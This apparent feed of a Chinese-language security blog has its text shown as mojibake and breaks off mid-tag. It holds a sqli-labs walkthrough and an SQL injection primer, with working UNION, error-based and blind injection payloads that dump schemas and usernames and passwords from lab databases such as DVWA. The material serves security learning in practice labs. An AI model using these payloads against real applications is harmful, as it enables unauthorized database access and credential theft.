href="#æ³•ä¸€ï¼šUNIONè”åˆæŸ¥è¯¢æ³¨å…¥">ğŸ­</a>æ³•ä¸€ï¼šUNIONè”åˆæŸ¥è¯¢æ³¨å…¥</h4><ol><li>ç”¨and 1=2æµ‹è¯• ï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œæ‰€ä»¥è¯¥åœ°æ–¹ä¸æ˜¯æ•°å€¼æŸ¥è¯¢ã€‚</li><li>å°è¯•åœ¨idåé¢åŠ ä¸Šâ€™ï¼Œé¡µé¢å›æ˜¾ä¸æ­£å¸¸ï¼Œå¯èƒ½å­˜åœ¨SQLå­—ç¬¦æ³¨å…¥ã€‚</li><li>ç”¨â€“+å°†sqlåé¢çš„è¯­å¥æ³¨è§†æ‰åï¼Œé¡µé¢å›æ˜¾æ­£å¸¸ï¼Œåˆ™è¯æ˜è¿™ä¸ªåœ°æ–¹æ˜¯å•å¼•å·å­—ç¬¦å‹æ³¨å…¥</li><li>ä½¿ç”¨order by è¯­å¥åˆ¤æ–­æœ‰å‡ åˆ—æ•°æ®ï¼›order by 3é¡µé¢å›æ˜¾æ­£å¸¸ï¼Œorder by 4é¡µé¢å›æ˜¾ä¸æ­£å¸¸ï¼Œè¯´æ˜æ­¤è¡¨ä¸€ä¸ªæœ‰3åˆ—ã€‚</li><li>å°†id=1æ”¹ä¸ºä¸€ä¸ªæ•°æ®åº“ä¸å­˜åœ¨çš„idå€¼ï¼Œå¦‚-1ï¼ˆå½“ç”¨id=1çš„æ—¶å€™æ‰§è¡Œçš„ç»“æœåªæœ‰ä¸€æ¡è®°å½•ï¼Œå› ä¸ºåœ¨ index.php ä¸­å¹¶æ²¡æœ‰å¾ªç¯å–å‡ºæ•°æ®ï¼Œ<strong>æ•…è®©ç¬¬ä¸€è¡ŒæŸ¥è¯¢çš„ç»“æœæ˜¯ç©ºé›†ï¼Œunionå³è¾¹çš„æŸ¥è¯¢ç»“æœè‡ªç„¶å°±æˆä¸ºäº†ç¬¬ä¸€è¡Œ</strong>ï¼Œæ‰“å°åœ¨ç½‘é¡µä¸Šäº†ï¼Œidä¸€èˆ¬æ˜¯æ•°å­—ï¼Œä»1å¼€å§‹è‡ªå¢çš„ï¼Œå¯æŠŠidå€¼è®¾ä¸ºéæ­£æ•°ï¼ˆè´Ÿæ•°æˆ–0ï¼‰ï¼Œæµ®ç‚¹æ•°ï¼Œå­—ç¬¦å‹æˆ–å­—ç¬¦ä¸²ï¼‰ä½¿ç”¨union select 1,2,3è”åˆæŸ¥è¯¢è¯­å¥æŸ¥çœ‹é¡µé¢æ˜¯å¦æœ‰æ˜¾ç¤ºä½ã€‚<img src="/2020/11/08/sqli/11.jpg" alt="11"></li></ol><p>è¾“å‡ºç»“æœè¯´æ˜é¡µé¢æœ‰2ä¸ªæ˜¾ç¤ºä½ã€‚</p><p>6.ç”¨sqlæŸ¥è¯¢è¯­å¥ä¾æ¬¡çˆ†ç ´å‡ºæ•°æ®åº“å†…çš„æ•°æ®åº“åï¼Œè¡¨åï¼Œåˆ—åï¼Œå­—æ®µä¿¡æ¯ã€‚</p><p><strong>æŸ¥è¯¢æ•°æ®åº“å:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+</code><img src="/2020/11/08/sqli/12.jpg" alt="12"></p><p><strong>æŸ¥è¯¢æ‰€æœ‰è¡¨å:</strong></p><p><code>union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+</code><img src="/2020/11/08/sqli/13.jpg" alt="13"></p><p><strong>æŸ¥åˆ—åï¼š</strong></p><p><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+</code></p><p><img src="/2020/11/08/sqli/14.jpg" alt="14"></p><p><strong>æŸ¥è¯¢ç”¨æˆ·åï¼Œå¯†ç :</strong></p><p><code>union select 1,group_concat(username,0x3a,password),3 from users --+</code></p><p><img src="/2020/11/08/sqli/15.jpg" alt="15"></p><h2 id="Less-3"><a class="header-anchor" href="#Less-3">ğŸ­</a>Less-3</h2><h4 id="æ³•äºŒï¼šæŠ¥é”™å‹æ³¨å…¥"><a class="header-anchor" href="#æ³•äºŒï¼šæŠ¥é”™å‹æ³¨å…¥">ğŸ­</a>æ³•äºŒï¼šæŠ¥é”™å‹æ³¨å…¥</h4><p>å› less1-4çš„æ­¥éª¤ç±»ä¼¼ï¼Œæ•…æŠ¥é”™å‹æ³¨å…¥ä»¥less3ä¸ºä¾‹ã€‚</p><p>è¾“å…¥å•å¼•å·æŠ¥é”™ï¼Œè¾“å…¥ --+åä»æŠ¥é”™ï¼Œæ•…ä¸æ˜¯ç®€å•çš„å•å¼•å·æŠ¥é”™ï¼›è¾“å…¥<code>?id=1') --+ </code>å›æ˜¾ç¤ºæ­£å¸¸ï¼Œåˆ™è¯æ˜less-3å±äºä»¥(â€˜â€™)çš„æ–¹å¼é—­åˆå­—ç¬¦ä¸²ã€‚</p><p><strong>çˆ†è¡¨</strong></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+</code></p><p><img src="/2020/11/08/sqli/16.jpg" alt="16"></p><p><strong>çˆ†åˆ—</strong></p><p><code>and%201=extractvalue(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+</code><img src="/2020/11/08/sqli/17.jpg" alt="17"></p><p><strong>çˆ†å€¼</strong><br><code> and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+</code></p><p><img src="/2020/11/08/sqli/18.jpg" alt="18"></p><p><code>and 1=extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in ('Dumb','I-kill-you'))))--+</code></p><p><img src="/2020/11/08/sqli/19.jpg" alt="19"></p><h2 id="Less-2"><a class="header-anchor" href="#Less-2">ğŸ­</a>Less-2</h2><p><code>?id=1 and 1=2 --+</code>å›æ˜¾ä¸æ­£å¸¸ï¼Œåˆ¤æ–­ä¸ºæ•°å­—å‹æ³¨å…¥ï¼ŒæŠŠç¬¬ä¸€é¢˜ä¸­id=1åé¢çš„å•å¼•å·å»æ‰ï¼Œå…¶å®ƒä¿æŒä¸å˜ã€‚</p><h2 id="Less-4"><a class="header-anchor" href="#Less-4">ğŸ­</a>Less-4</h2><p>è¾“å…¥å•å¼•å·ä¸æŠ¥é”™ï¼Œ<code>?id=1')</code>ä¹Ÿä¸æŠ¥é”™<code>?id=1&quot;)</code>æŠ¥é”™ï¼ŒåŠ ä¸Š<code>--+</code>åå›æ˜¾æ­£å¸¸ï¼Œæ•…ä¸ºä¸(â€œâ€)çš„æ–¹å¼é—­åˆå­—ç¬¦ä¸²ç±»å‹ï¼›æ–¹æ³•ç±»ä¼¼ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLåŸºç¡€</title>
    <link href="/2020/11/08/SQL/"/>
    <url>/2020/11/08/SQL/</url>
    
    <content type="html"><![CDATA[<h1>SQL</h1><p>sqlæ³¨å…¥å°±æ˜¯ä¸€ç§é€šè¿‡æ“ä½œè¾“å…¥æ¥ä¿®æ”¹åå°æ“ä½œè¯­å¥è¾¾åˆ°æ‰§è¡Œæ¶æ„sqlè¯­å¥æ¥è¿›è¡Œæ”»å‡»çš„æŠ€æœ¯ã€‚</p><ul><li><a href="#sql">SQL</a><ul><li><a href="#%E5%88%86%E7%B1%BB">åˆ†ç±»</a><ul><li><a href="#%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B">å˜é‡ç±»å‹</a></li><li><a href="#http%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F">HTTPæäº¤æ–¹å¼</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">æ³¨å…¥æ–¹å¼</a></li><li><a href="#%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98">ç¼–ç é—®é¢˜</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93mysql-50%E4%BB%A5%E4%B8%8A">ä¿¡æ¯æ•°æ®åº“ï¼ˆMySql 5.0ä»¥ä¸Šï¼‰</a><ul><li><a href="#information_schema"><strong>information_schema</strong></a></li><li><a href="#schemata%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><strong>SCHEMATA</strong>(æ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯)</a></li><li><a href="#tables%E5%AD%98%E5%82%A8%E8%A1%A8%E4%BF%A1%E6%81%AF"><strong>TABLES</strong>(å­˜å‚¨è¡¨ä¿¡æ¯)</a></li><li><a href="#columns%E5%82%A8%E5%AD%98%E5%88%97%E4%BF%A1%E6%81%AF"><strong>COLUMNS</strong>(å‚¨å­˜åˆ—ä¿¡æ¯)</a></li><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9E%E6%8E%A5%E5%87%BD%E6%95%B0">å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B">åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹</a><ul><li><a href="#%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0">è·å–å­—æ®µæ•°</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">è·å–ç³»ç»Ÿæ•°æ®åº“å</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D">è·å–å½“å‰æ•°æ®åº“å</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8">è·å–æ•°æ®åº“ä¸­çš„è¡¨</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5">è·å–è¡¨ä¸­çš„å­—æ®µ</a></li><li><a href="#%E8%8E%B7%E5%8F%96%E5%90%84%E4%B8%AA%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC">è·å–å„ä¸ªå­—æ®µçš„å€¼</a></li></ul></li><li><a href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">å¸¸ç”¨æ³¨å…¥æ–¹å¼</a><ul><li><a href="#union%E6%B3%A8%E5%85%A5">unionæ³¨å…¥</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5%E6%9E%84%E9%80%A0%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD">å¸ƒå°”æ³¨å…¥(æ„é€ é€»è¾‘åˆ¤æ–­)</a><ul><li><a href="#regexp%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5">regexpæ­£åˆ™æ³¨å…¥</a></li><li><a href="#like%E5%8C%B9%E9%85%8D%E6%B3%A8%E5%85%A5">likeåŒ¹é…æ³¨å…¥</a></li></ul></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">æŠ¥é”™æ³¨å…¥</a><ul><li><a href="#floor%E5%92%8Crand">floor()å’Œrand()</a></li><li><a href="#extractvalue">extractvalue()</a></li><li><a href="#updatexml">updatexml()</a></li><li><a href="#geometrycollection">geometrycollection()</a></li><li><a href="#multipoint">multipoint()</a></li><li><a href="#polygon">polygon()</a></li><li><a href="#multipolygon">multipolygon()</a></li><li><a href="#linestring">linestring()</a></li><li><a href="#multilinestring">multilinestring()</a></li><li><a href="#exp">exp()</a></li></ul></li><li><a href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5">æ—¶é—´æ³¨å…¥</a></li><li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">å †å æŸ¥è¯¢æ³¨å…¥</a></li><li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5">äºŒæ¬¡æ³¨å…¥</a></li><li><a href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5">å®½å­—èŠ‚æ³¨å…¥</a></li></ul></li></ul></li></ul><h2 id="åˆ†ç±»"><a class="header-anchor" href="#åˆ†ç±»">ğŸ­</a>åˆ†ç±»</h2><h4 id="å˜é‡ç±»å‹"><a class="header-anchor" href="#å˜é‡ç±»å‹">ğŸ­</a>å˜é‡ç±»å‹</h4><ul><li>æ•°å­—å‹</li><li>å­—ç¬¦å‹</li></ul><h4 id="HTTPæäº¤æ–¹å¼"><a class="header-anchor" href="#HTTPæäº¤æ–¹å¼">ğŸ­</a>HTTPæäº¤æ–¹å¼</h4><ul><li>GETæ³¨å…¥</li><li>POSTæ³¨å…¥</li><li>Cookieæ³¨å…¥</li></ul><h4 id="æ³¨å…¥æ–¹å¼"><a class="header-anchor" href="#æ³¨å…¥æ–¹å¼">ğŸ­</a>æ³¨å…¥æ–¹å¼</h4><ul><li>æŠ¥é”™æ³¨å…¥</li><li>ç›²æ³¨<ul><li>å¸ƒå°”ç›²æ³¨</li><li>æ—¶é—´ç›²æ³¨</li></ul></li><li>unionæ³¨å…¥</li></ul><h4 id="ç¼–ç é—®é¢˜"><a class="header-anchor" href="#ç¼–ç é—®é¢˜">ğŸ­</a>ç¼–ç é—®é¢˜</h4><ul><li>å®½å­—èŠ‚æ³¨å…¥</li></ul><h2 id="ä¿¡æ¯æ•°æ®åº“ï¼ˆMySql-5-0ä»¥ä¸Šï¼‰"><a class="header-anchor" href="#ä¿¡æ¯æ•°æ®åº“ï¼ˆMySql-5-0ä»¥ä¸Šï¼‰">ğŸ­</a>ä¿¡æ¯æ•°æ®åº“ï¼ˆMySql 5.0ä»¥ä¸Šï¼‰</h2><h4 id="information-schema"><a class="header-anchor" href="#information-schema">ğŸ­</a><strong>information_schema</strong></h4><p>ç³»ç»Ÿæ•°æ®åº“ï¼Œè®°å½•å½“å‰æ•°æ®åº“çš„æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—ï¼Œç”¨æˆ·æƒé™ä¿¡æ¯ã€‚</p><h4 id="SCHEMATA-æ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯"><a class="header-anchor" href="#SCHEMATA-æ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯">ğŸ­</a><strong>SCHEMATA</strong>(æ‰€æœ‰æ•°æ®åº“çš„åŸºæœ¬ä¿¡æ¯)</h4><pre><code class="hljs crystal">æŸ¥è¯¢æ•°æ®åº“ï¼š<span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">schema_name</span>) <span class="hljs-title">from</span> <span class="hljs-title">information_schema</span>.<span class="hljs-title">schemata</span> </span></code></pre><h4 id="TABLES-å­˜å‚¨è¡¨ä¿¡æ¯"><a class="header-anchor" href="#TABLES-å­˜å‚¨è¡¨ä¿¡æ¯">ğŸ­</a><strong>TABLES</strong>(å­˜å‚¨è¡¨ä¿¡æ¯)</h4><pre><code class="hljs crystal">æŸ¥è¯¢è¡¨ï¼š <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,<span class="hljs-title">group_concat</span>(<span class="hljs-title">table_name</span>) <span class="hljs-title">from</span></span>information_schema.tables where table_schema=<span class="hljs-string">&#x27;è¡¨å&#x27;</span></code></pre><h4 id="COLUMNS-å‚¨å­˜åˆ—ä¿¡æ¯"><a class="header-anchor" href="#COLUMNS-å‚¨å­˜åˆ—ä¿¡æ¯">ğŸ­</a><strong>COLUMNS</strong>(å‚¨å­˜åˆ—ä¿¡æ¯)</h4><pre><code class="hljs pgsql">æŸ¥è¯¢åˆ—ï¼š<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;è¡¨å&#x27;</span></code></pre><h4 id="å­—ç¬¦ä¸²è¿æ¥å‡½æ•°"><a class="header-anchor" href="#å­—ç¬¦ä¸²è¿æ¥å‡½æ•°">ğŸ­</a>å­—ç¬¦ä¸²è¿æ¥å‡½æ•°</h4><p>concat(str1,str2,â€¦)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p><p>concata_ws(separator,str1,str2,â€¦)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</p><p>group_concat(str1,str2,â€¦)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</p><h2 id="åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹"><a class="header-anchor" href="#åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹">ğŸ­</a>åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹</h2><h4 id="è·å–å­—æ®µæ•°"><a class="header-anchor" href="#è·å–å­—æ®µæ•°">ğŸ­</a>è·å–å­—æ®µæ•°</h4><pre><code class="hljs crmsh"><span class="hljs-keyword">order</span> <span class="hljs-title">by</span> n</code></pre><h4 id="è·å–ç³»ç»Ÿæ•°æ®åº“å"><a class="header-anchor" href="#è·å–ç³»ç»Ÿæ•°æ®åº“å">ğŸ­</a>è·å–ç³»ç»Ÿæ•°æ®åº“å</h4><pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,schema_name <span class="hljs-keyword">from</span> information_schema.schemata</code></pre><h4 id="è·å–å½“å‰æ•°æ®åº“å"><a class="header-anchor" href="#è·å–å½“å‰æ•°æ®åº“å">ğŸ­</a>è·å–å½“å‰æ•°æ®åº“å</h4><pre><code class="hljs angelscript">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database()</code></pre><h4 id="è·å–æ•°æ®åº“ä¸­çš„è¡¨"><a class="header-anchor" href="#è·å–æ•°æ®åº“ä¸­çš„è¡¨">ğŸ­</a>è·å–æ•°æ®åº“ä¸­çš„è¡¨</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()</code></pre><p>or</p><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span></code></pre><p>ä½†æ³•äºŒéœ€ä¸€ä¸€æŸ¥è¯¢è¡¨åã€‚</p><h4 id="è·å–è¡¨ä¸­çš„å­—æ®µ"><a class="header-anchor" href="#è·å–è¡¨ä¸­çš„å­—æ®µ">ğŸ­</a>è·å–è¡¨ä¸­çš„å­—æ®µ</h4><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_shema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;è¡¨å&#x27;</span></code></pre><h4 id="è·å–å„ä¸ªå­—æ®µçš„å€¼"><a class="header-anchor" href="#è·å–å„ä¸ªå­—æ®µçš„å€¼">ğŸ­</a>è·å–å„ä¸ªå­—æ®µçš„å€¼</h4><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>//å‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸º<span class="hljs-keyword">user</span>ï¼Œä¸”å­—æ®µä¸ºusernameå’Œ<span class="hljs-keyword">password</span></code></pre><h2 id="å¸¸ç”¨æ³¨å…¥æ–¹å¼"><a class="header-anchor" href="#å¸¸ç”¨æ³¨å…¥æ–¹å¼">ğŸ­</a>å¸¸ç”¨æ³¨å…¥æ–¹å¼</h2><h3 id="unionæ³¨å…¥"><a class="header-anchor" href="#unionæ³¨å…¥">ğŸ­</a>unionæ³¨å…¥</h3><p>unionçš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªsqlè¯­å¥è¿›è¡Œè”åˆã€‚å½“æ³¨å…¥å‚æ•°çš„æ•°æ®åœ¨æ•°æ®åº“ä¸­ä¸å­˜åœ¨æ—¶ï¼Œä¸¤ä¸ªsqlè¯­å¥è¿›è¡Œè”åˆæ“ä½œæ—¶ï¼Œå‰ä¸€ä¸ªè¯­å¥é€‰æ‹©çš„å†…å®¹ä¸ºç©ºæ—¶ï¼Œåé¢è¯­å¥çš„æŸ¥è¯¢å†…å®¹å°±æ˜¾ç¤ºå‡ºæ¥ã€‚å¦‚:</p><pre><code class="hljs crystal">id =-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2,3 </span></code></pre><h3 id="å¸ƒå°”æ³¨å…¥-æ„é€ é€»è¾‘åˆ¤æ–­"><a class="header-anchor" href="#å¸ƒå°”æ³¨å…¥-æ„é€ é€»è¾‘åˆ¤æ–­">ğŸ­</a>å¸ƒå°”æ³¨å…¥(æ„é€ é€»è¾‘åˆ¤æ–­)</h3><p>boolean æ ¹æ®æ³¨å…¥ä¿¡æ¯è¿”å›true or fales,æ— ä»»ä½•æŠ¥é”™</p><p><strong>ç›¸å…³å‡½æ•°</strong></p><p><strong>length(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦</p><p><strong>substr(str, pos, len)</strong> ï¼šå°†strä»posä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹</p><p><strong>mid(str,pos,len)</strong> ï¼šè·Ÿsubsträ¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²</p><p><strong>ascii(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼</p><p><strong>ord(str)</strong> ï¼šå°†å­—ç¬¦æˆ–å¸ƒå°”ç±»å‹è½¬æˆascllç </p><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and length (database())=x(æŸä¸ªå€¼ï¼Œç”¨å¤§äºæˆ–è€…å°äºæŸä¸ªå€¼ä¹Ÿå¯ä»¥)--+//çŒœæ•°æ®åº“åé•¿åº¦ï¼š(çŒœå¯¹æ—¶é¡µé¢æ‰ä¼šæ˜¾ç¤ºæ­£å¸¸)</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> length((<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">18</span> <span class="hljs-comment">--+ //æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“çš„é•¿åº¦</span><span class="hljs-string">&#x27; and left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27;--+ //çŒœæ•°æ®åº“çš„åå­— </span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">101</span><span class="hljs-comment">--+//è·å–æ•°æ®åº“ä¸‹çš„è¡¨</span><span class="hljs-string">&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; limit 0,1))=9 --+ æŸ¥è¯¢è¡¨çš„é•¿åº¦</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> regexp <span class="hljs-string">&#x27;^us[a-z]&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">--+//è·å–è¡¨é‡Œçš„åˆ—å</span><span class="hljs-string">&#x27; and length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1))&gt;1 --+ //æŸ¥è¯¢åˆ—çš„é•¿åº¦</span><span class="hljs-string"></span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ord(mid((<span class="hljs-keyword">select</span> ifnull(cast(username <span class="hljs-keyword">as</span> <span class="hljs-type">char</span>),xï¼ˆé”™è¯¯è¿”å›å€¼ï¼‰)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+ //è·å–åˆ—çš„å†…å®¹</span></code></pre><h4 id="regexpæ­£åˆ™æ³¨å…¥"><a class="header-anchor" href="#regexpæ­£åˆ™æ³¨å…¥">ğŸ­</a>regexpæ­£åˆ™æ³¨å…¥</h4><pre><code class="hljs pgsql"><span class="hljs-string">&#x27; and 1=(user() regexpri&#x27;</span>^<span class="hljs-string">&#x27;) --+//æŸ¥çœ‹å½“å‰æ“ä½œçš„ç”¨æˆ·</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">database</span>() regexp<span class="hljs-string">&#x27;^s&#x27;</span>) <span class="hljs-comment">--+//æŸ¥çœ‹å½“å‰æ•°æ®åº“</span><span class="hljs-string">&#x27; and ((select schema_name from information_schema.schemata limit 0,1) regexp&#x27;</span>^i[a-z]<span class="hljs-string">&#x27; )=1 --+//æ­£åˆ™çŒœæµ‹ç¬¬ä¸€ä¸ªæ•°æ®åº“çš„åå­—</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;dvwa&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)regexp <span class="hljs-string">&#x27;^g[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//æ­£åˆ™çŒœæµ‹dvwaæ•°æ®åº“é‡Œç¬¬ä¸€ä¸ªè¡¨çš„åå­—</span> <span class="hljs-string">&#x27; and ((select column_name from information_schema.columns where table_schema=&#x27;</span>dvwa<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1) regexp &#x27;</span>^u[a-z]<span class="hljs-string">&#x27; )=1 --+//æ­£åˆ™çŒœæµ‹dvwaæ•°æ®åº“é‡Œçš„usersè¡¨é‡Œçš„ç¬¬ä¸€ä¸ªå€¼</span><span class="hljs-string"> </span><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> ((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dvwa.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) regexp <span class="hljs-string">&#x27;^a[a-z]&#x27;</span> )=<span class="hljs-number">1</span> <span class="hljs-comment">--+//æ­£åˆ™çŒœæµ‹dvwaæ•°æ®åº“é‡Œçš„usersè¡¨é‡Œçš„userå­—æ®µé‡Œçš„ç¬¬ä¸€ä¸ªå€¼</span></code></pre><h4 id="likeåŒ¹é…æ³¨å…¥"><a class="header-anchor" 